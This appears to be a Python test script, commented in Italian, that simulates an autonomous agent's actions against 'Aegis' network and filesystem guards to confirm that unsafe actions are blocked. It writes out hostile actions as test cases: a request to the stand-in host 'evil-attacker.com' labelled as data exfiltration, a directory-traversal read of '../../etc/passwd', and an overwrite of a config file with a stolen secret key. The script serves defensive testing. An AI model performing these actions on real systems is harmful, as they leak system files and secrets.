import urllib.request
from core.network_guard import enable_network_guard, NetworkSecurityException
from core.fs_guard import enable_fs_guard, FileSecurityException

# 1. ATTIVAZIONE SCUDI (Aegis Initialization)
enable_network_guard()
enable_fs_guard()

print("\n--- INIZIO SIMULAZIONE AGENTE AUTONOMO ---\n")

def simulate_agent_action(description, action_func):
    print(f"[*] Task: {description}")
    try:
        action_func()
        print("    [+] ESITO: Successo (Consentito)\n")
    except (NetworkSecurityException, FileSecurityException) as e:
        print(f"    [-] ESITO: BLOCCATO DA AEGIS -> {e}\n")
    except Exception as e:
        print(f"    [!] ESITO: Fallito (Errore di sistema: {e})\n")

# 2. TEST DELLE POLICY
simulate_agent_action("Connessione API autorizzata (GitHub)", 
                     lambda: urllib.request.urlopen("https://api.github.com", timeout=3))

simulate_agent_action("Tentativo esfiltrazione dati (Connessione a dominio malevolo)", 
                     lambda: urllib.request.urlopen("http://evil-attacker.com", timeout=3))

simulate_agent_action("Creazione file report temporaneo (Operazione sicura)", 
                     lambda: open("temp_report.txt", "w").write("Data analysis complete."))

simulate_agent_action("Tentativo di lettura file password (Directory Traversal)", 
                     lambda: open("../../etc/passwd", "r").read())

simulate_agent_action("Tentativo di modifica configurazioni di sistema (.env)", 
                     lambda: open("config.env", "w").write("SECRET_KEY=stolen"))

print("--- SIMULAZIONE COMPLETATA. CONTROLLARE LA DASHBOARD PER I LOG DI AUDIT. ---")